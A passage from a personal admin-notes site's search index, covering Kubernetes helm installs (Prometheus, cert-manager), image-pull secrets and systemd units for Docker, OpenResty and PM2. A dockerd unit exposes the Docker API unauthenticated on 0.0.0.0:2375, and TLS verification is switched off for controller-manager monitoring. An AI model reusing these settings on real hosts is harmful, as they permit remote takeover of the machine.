kubeControllerManagerDefaultPort=10257 ## helm ## https://github.com/prometheus-community/helm-charts/tree/main/charts/kube-prometheus-stack ## 1. monitoring every namespaces and export port ## 2. export grafana port ## 3. monitoring kubeControllerManager helm repo add prometheus-community https://prometheus-community.github.io/helm-charts helm repo update helm install kube-prometheus-stack prometheus-community/kube-prometheus-stack \\ --namespace \u0026#34;${nameSpace}\u0026#34; \\ --create-namespace \\ --set prometheus.prometheusSpec.podMonitorSelectorNilUsesHelmValues=false \\ --set prometheus.prometheusSpec.ruleSelectorNilUsesHelmValues=false \\ --set prometheus.prometheusSpec.serviceMonitorSelectorNilUsesHelmValues=false \\ --set prometheus.service.type=NodePort \\ --set prometheus.service.nodePort=${prometheusPort} \\ --set grafana.service.type=NodePort \\ --set grafana.service.nodePort=${grafanaPort} \\ --set kubeControllerManager.service.port=${kubeControllerManagerDefaultPort} \\ --set kubeControllerManager.service.targetPort=${kubeControllerManagerDefaultPort} \\ --set kubeControllerManager.ServiceMonitor.https=true \\ --set kubeControllerManager.ServiceMonitor.insecureSkipVerify=true \\ --set kubeControllerManager.ServiceMonitor.serverName=localhost sleep 30 account=$(kubectl -n \u0026#34;${nameSpace}\u0026#34; get secret kube-prometheus-stack-grafana -o jsonpath=\u0026#34;{.data.admin-user}\u0026#34; | base64 -d) password=$(kubectl -n \u0026#34;${nameSpace}\u0026#34; get secret kube-prometheus-stack-grafana -o jsonpath=\u0026#34;{.data.admin-password}\u0026#34; | base64 -d) Create and use secret command kubectl -n nginx create secret docker-registry gitlab --docker-server=registry.go2cloudten.com --docker-username=ricky --docker-password=\u0026#34;token or password\u0026#34; config imagePullSecrets: - name: gitlab Run pod kubectl run -it --rm --image=registry.go2cloudten.com/it/docker/backup test --image-pull-policy=IfNotPresent -- bash ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/notes/bash/k8s/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003ecert-manager\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://cert-manager.io/docs\" target=\"_blank\" rel=\"noopener\"\u003ecert-manager\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/notes/bash/k8s/files/cert-manager/cert-manager-aws-iam-role.json\"\u003eRoute53 IAM Role\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/notes/bash/k8s/files/cert-manager/cert-manager-resource.yaml\"\u003eCert Manager Resource\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/notes/bash/k8s/files/cert-manager/cert-generate-resource.yaml\"\u003eCert Generate Resource\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/notes/bash/k8s/files/cert-manager/cert-ingress-resource.yaml\"\u003eCert Ingress Resource\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# install the cert-manager CustomResourceDefinition resources\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ekubectl apply -f https://github.com/cert-manager/cert-manager/releases/download/v1.13.1/cert-manager.crds.yaml\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Add the Jetstack Helm repository\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ehelm repo add jetstack https://charts.jetstack.io\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ehelm repo update\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# install the cert-manager helm chart\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ehelm install \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e  cert-manager jetstack/cert-manager \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e  --namespace cert-manager \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e  --create-namespace \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e  --version v1.13.1 \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e  --set installCRDs\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003etrue\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  --set prometheus.enabled\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003efalse \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e  --set webhook.timeoutSeconds\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# uninstalling\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ehelm delete my-release\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ekubectl delete -f https://github.com/cert-manager/cert-manager/releases/download/v1.13.1/cert-manager.crds.yaml\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# create clusterissuer\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ekubectl apply -f cert-manager-resource.yaml\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# generate certificate\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ekubectl apply -f cert-generate-resource.yaml\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# create ingress controller\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ekubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.8.2/deploy/static/provider/cloud/deploy.yaml\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# create ingress\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ekubectl apply -f cert-ingress-resource.yaml\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003ehelm\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# install plugin\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ehelm plugin install https://github.com/chartmuseum/helm-push.git\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# add repo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## helm repo add --username gitlab-ci-token --password ${CI_JOB_TOKEN} ${CI_PROJECT_NAME} ${CI_API_V4_URL}/projects/${CI_PROJECT_ID}/packages/helm/stable\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ehelm repo add go2helm https://gitlab.go2cloudten.com/api/v4/projects/29/packages/helm/stable --username ricky\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# push chart\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## https://docs.gitlab.com/ee/user/packages/helm_repository/\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ehelm cm-push ./proxy-0.1.0.tgz go2helm\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003ekompose\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ekompose --file docker-compose.yml convert\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003egitlab-runner\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cp\u003e\u003ca href=\"https://docs.gitlab.com/ee/user/project/clusters/add_remove_clusters.html\" target=\"_blank\" rel=\"noopener\"\u003elink\u003c/a\u003e\u003c/p\u003e","tags":null,"title":"K8s Command"},{"categories":null,"contents":" docker.service ExecStart=/usr/bin/dockerd -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock --bip 10.255.0.1/16 --containerd=/run/containerd/containerd.sock --insecure-registry hub.srjob.co:8888 --insecure-registry registry.knowhow.fun gd.service [Unit] Description=Fetch DNS After=network.target After=mysql.service [Service] WorkingDirectory=/data/dns ExecStart=/data/dns/gd -o hourly ExecReload=/bin/kill -s HUP $MAINPID Restart=always [Install] WantedBy=multi-user.target openresty.service [Unit] Description=The OpenResty Application Platform After=syslog.target network-online.target remote-fs.target nss-lookup.target Wants=network-online.target [Service] Type=forking WorkingDirectory=/data/config/nginx PIDFile=/data/config/nginx/logs/nginx.pid ExecStartPre=/usr/bin/chown -R root:root /data/nginx ExecStartPre=/usr/bin/rm -f /data/nginx/logs/nginx.pid ExecStartPre=/usr/local/openresty/nginx/sbin/nginx -p /data/nginx -t ExecStart=/usr/local/openresty/nginx/sbin/nginx -p /data/nginx ExecReload=/bin/kill -s HUP $MAINPID ExecStop=-/sbin/start-stop-daemon --quiet --stop --retry QUIT/5 --pidfile /data/nginx/logs/nginx.pid #ExecStop=/bin/kill -s QUIT $MAINPID KillSignal=SIGQUIT TimeoutStopSec=5 KillMode=process PrivateTmp=true LimitNOFILE=1048576 [Install] WantedBy=multi-user.target pm2.service [Unit] Description=PM2 process manager Documentation=https://pm2.keymetrics.io/ After=network.target [Service] Type=forking User=root LimitNOFILE=infinity LimitNPROC=infinity LimitCORE=infinity Environment=PM2_HOME=/root/.pm2 PIDFile=/root/.pm2/pm2.pid WorkingDirectory=/game/publish ExecStart=/lib/node_modules/pm2/bin/pm2 start game_api.json manage.json ExecReload=/lib/node_modules/pm2/bin/pm2 reload all ExecStop=/lib/node_modules/pm2/bin/pm2 kill [Install] WantedBy=multi-user.target logrotate /data/gameapi/logs/*.log { create 0644 nobody root daily rotate 30 dateext missingok notifempty compress sharedscripts postrotate /bin/kill -USR1 `cat /data/gameapi/logs/nginx.pid 2\u0026gt;/dev/null` 2\u0026gt;/dev/null || true endscript } ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/notes/docs/linux/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003edocker.service\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eExecStart\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/usr/bin/dockerd -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock --bip 10.255.0.1/16 --containerd\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/run/containerd/containerd.sock --insecure-registry hub.srjob.co:8888 --insecure-registry registry.knowhow.fun\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003egd.service\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eUnit\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eDescription\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eFetch DNS\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eAfter\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003enetwork.target\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eAfter\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003emysql.service\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eService\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eWorkingDirectory\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/data/dns\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eExecStart\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/data/dns/gd -o hourly\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eExecReload\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/bin/kill -s HUP $MAINPID\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eRestart\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ealways\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eInstall\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eWantedBy\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003emulti-user.target\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eopenresty.service\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eUnit\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eDescription\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eThe OpenResty Application Platform\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eAfter\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003esyslog.target network-online.target remote-fs.target nss-lookup.target\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eWants\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003enetwork-online.target\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eService\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eType\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eforking\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eWorkingDirectory\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/data/config/nginx\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ePIDFile\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/data/config/nginx/logs/nginx.pid\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eExecStartPre\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/usr/bin/chown -R root:root /data/nginx\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eExecStartPre\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/usr/bin/rm -f /data/nginx/logs/nginx.pid\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eExecStartPre\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/usr/local/openresty/nginx/sbin/nginx -p /data/nginx -t\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eExecStart\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/usr/local/openresty/nginx/sbin/nginx -p /data/nginx\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eExecReload\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/bin/kill -s HUP $MAINPID\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eExecStop\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e-/sbin/start-stop-daemon --quiet --stop --retry QUIT/5 --pidfile /data/nginx/logs/nginx.pid\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#ExecStop=/bin/kill -s QUIT $MAINPID\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eKillSignal\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eSIGQUIT\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eTimeoutStopSec\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e5\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eKillMode\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eprocess\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ePrivateTmp\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003etrue\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eLimitNOFILE\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1048576\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eInstall\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eWantedBy\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003emulti-user.target\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003epm2.service\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eUnit\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eDescription\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ePM2 process manager\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eDocumentation\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ehttps://pm2.keymetrics.io/\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eAfter\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003enetwork.target\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eService\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eType\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eforking\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eUser\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eroot\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eLimitNOFILE\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003einfinity\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eLimitNPROC\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003einfinity\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eLimitCORE\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003einfinity\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eEnvironment\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ePM2_HOME\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/root/.pm2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ePIDFile\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/root/.pm2/pm2.pid\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eWorkingDirectory\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/game/publish\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eExecStart\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/lib/node_modules/pm2/bin/pm2 start game_api.json manage.json\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eExecReload\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/lib/node_modules/pm2/bin/pm2 reload all\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eExecStop\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/lib/node_modules/pm2/bin/pm2 kill\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan 